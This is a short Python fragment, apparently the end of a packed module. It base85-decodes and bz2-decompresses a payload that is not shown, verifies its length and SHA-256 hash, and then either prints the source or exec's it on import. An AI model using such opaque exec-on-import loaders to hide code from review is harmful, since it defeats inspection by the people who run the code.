parser = BZ2Decompressor()
source = parser.decompress(b85decode(b"".join(PAYLOAD.split())),max_length=64553)
assert parser.eof and not parser.unused_data
assert len(source) == 64552
assert sha256(source).hexdigest() == 'c6980390a89ae3c89fceea0c4e041fab371e4f38593a353497dae286fc1db31c'
if __name__ == "__main__":
    sys.stdout.buffer.write(source)
else:
    exec(compile(source, __file__, "exec"), globals())
